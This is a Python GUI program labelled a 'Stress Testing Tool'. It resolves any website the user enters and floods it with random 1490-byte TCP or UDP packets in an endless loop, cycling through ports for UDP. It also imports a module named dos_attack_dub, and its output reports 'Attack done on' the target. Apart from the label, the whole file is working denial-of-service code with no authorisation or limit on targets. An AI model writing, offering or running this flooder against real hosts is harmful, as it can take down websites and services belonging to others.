#!/usr/bin/python

from tkinter import *
import time,threading,socket,os,random
from dos_attack_dub import dosmain

flag = 1

sent = 0
port = 80
useprotocol = "TCP"
website = "MY"
t0 = time.time()
t1 = time.time()
bytes = random._urandom(1490)

def refresh(top):
    top.destroy()
    main()
    raise KeyboardInterrupt()

def main():
    top = Tk()
    top.title("Stress Testing Tool")

    # dosmain()
    L1 = Label(top, text="Enter URL: ")
    L1.pack( side = LEFT)
    E1 = Entry(top, bd =20,width=30)
    # E1.insert(INSERT, 'www.google.com')
    E1.pack(side = LEFT)
    # E1.place(x=30, y=10)
    # L1.place(x=0, y=10)
    # L2.place(x=0, y=50)
    E2 = Entry(top, bd =20,width=10)
    # E2.insert(INSERT,'UDP')
    E2.pack(side = RIGHT)
    # E2.place(x=30, y=50)
    L2 = Label(top, text="Enter Protocol TCP or UPD: ")
    L2.pack( side = RIGHT)
    #
    btn_text = StringVar()
    text = Text(top)
    text.insert(INSERT, "Hello.....")
    text.insert(INSERT, "\nWelcome to stress Testing Tool")

    text.pack(side=BOTTOM)

    B = Button(top, textvariable = btn_text, command=lambda: hello(top,btn_text, E1, E2, text))
    btn_text.set("Start Test")
    B.pack(side=TOP)


    # B1 = Button(top, textvariable = "Exit", command = refresh(top))
    # B1.pack(side=BOTTOM)

    top.mainloop()

def hello(top,btn_text,E1,E2,text):
    t = threading.Thread(target=helloCallBack,args=(top,btn_text,E1,E2,text))
    t.setDaemon(True)
    t.start()

def helloCallBack(top,btn_text,E1,E2,text):
    global t1, t0, sent, website

    if(E1.get() == "" or E2.get() == ""):
        from tkinter import messagebox
        messagebox.showinfo("Error!", "Website Name and Protocol type \ncannot be empty!")
    elif(btn_text.get() == "Start Test" ):
        btn_text.set("Stop Testing")
        text.config(state="normal")
        website = E1.get()
        useprotocol = E2.get().upper()
        #ip = socket.gethostbyname(website)
        try:
            # text.delete(1.0, END)
            ip = socket.gethostbyname(website)
            print(ip)
            # text.insert(END,'hey')
            text.insert(END,'\n\n************************************\nWebsite is: {}\nIP is: {}'.format(website,ip))
            port = 80
            # raise Exception()
            # time.sleep(4)
        except socket.gaierror:
            text.delete(1.0, END)
            print("Website Error")
            text.insert(END,'\nInvalid Website url/Error resolving IP Address!!\nPlease Try Again.\n************************************ ')
            time.sleep(4)
            refresh(top)

        try:
            if useprotocol == "TCP" :
                usedprotocol = socket.SOCK_STREAM
            elif useprotocol == "UDP" :
                usedprotocol = socket.SOCK_DGRAM
            else:
                # text.delete(1.0, END)
                # btn_text.set("Start Test")

                print('Wrong Protocol!')
                # time.sleep(0.02)
                text.insert(END, '\nWrong Choice of Protocol. Try Again!\n************************************')
                time.sleep(4)
                refresh(top)

            # TCP uses SOCK_STREAM and UDP uses SOCK_DGRAM

            sock = socket.socket(socket.AF_INET, usedprotocol)

        except socket.error as err:
            # text.delete(1.0, END)
            print('Exception Socket Error')
            text.insert(END,"\nException Socket Error!\nSocket creation failed with error %s \nTry Again!" % (err))
            time.sleep(4)
            refresh(top)
        # os.system("clear")
        sent = 0
        t0 = time.time()
        bytes = random._urandom(1490)
        sock.connect((ip, port))
        text.insert(INSERT,"\n************************************\nStress testing started!!\nPlease Wait!")
        text.edit_modified(FALSE)
        while True:
            try:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                if (usedprotocol != socket.SOCK_STREAM):
                    port = port + 1
                # print("Sent %s packet to %s through port:%s" % (sent, website, port))
                # printreqcount()
                if (sent == 1000):
                    print('Press Ctrl+C for Viewing Results')
                    text.insert(INSERT,"\nPress [Stop Testing] to see Result!")
                if port == 65534:
                    port = 1
            except KeyboardInterrupt:
                sent = 0
                t1 = time.time()
                print('\n\nAll done....\nAttack done on: {}\nTotal runnning time:{}\nTotal Packets Sent:{}\nPackets sent per second is: {}'.format(
                     website, (t1 - t0), sent, int(sent / (t1 - t0))))
                text.insert(INSERT,
                    '\n\nAll done....\nAttack done on: {}\nTotal runnning time:{}\nTotal Packets Sent:{}\nPackets sent per second is: {}'.format(
                        website, (t1 - t0), sent, int(sent / (t1 - t0))))
                # print('Protocol used is: ' + useprotocol)
                # print('Press refresh to start again!')
                #
                # text.insert(INSERT,'Protocol used is: ' + useprotocol)
                # text.insert(INSERT,'Press refresh to start again!')

                # If you actually want the program to exit

            except ConnectionResetError:
                sock.close()
                # time.sleep(0.001)
                sock = socket.socket(socket.AF_INET, usedprotocol)
                sock.connect((ip, port))


        #text.config(state=DISABLED)

        # t = threading.Thread(target=attack)
        # while(True):
        #     time.sleep(0.1)
        # t.start()

    else:
        if(flag == 1):
            t1 = time.time()
            print(
                '\n\nAll done....\nAttack done on: {}\nTotal runnning time:{}\nTotal Packets Sent:{}\nPackets sent per second is: {}'.format(
                    website, (t1 - t0), sent, int(sent / (t1 - t0))))
            text.insert(INSERT,
                        '\n\n************************************\nAll done....\nAttack done on: {}\nTotal runnning time:{}\nTotal Packets Sent:{}\nPackets sent per second is: {}\n\nIn 20 Seconds this window will close.'.format(
                            website, (t1 - t0), sent, int(sent / (t1 - t0))))
            # raise KeyboardInterrupt()
            text.config(state="disabled")
            time.sleep(20)
        refresh(top)

if __name__ == '__main__':
    main()


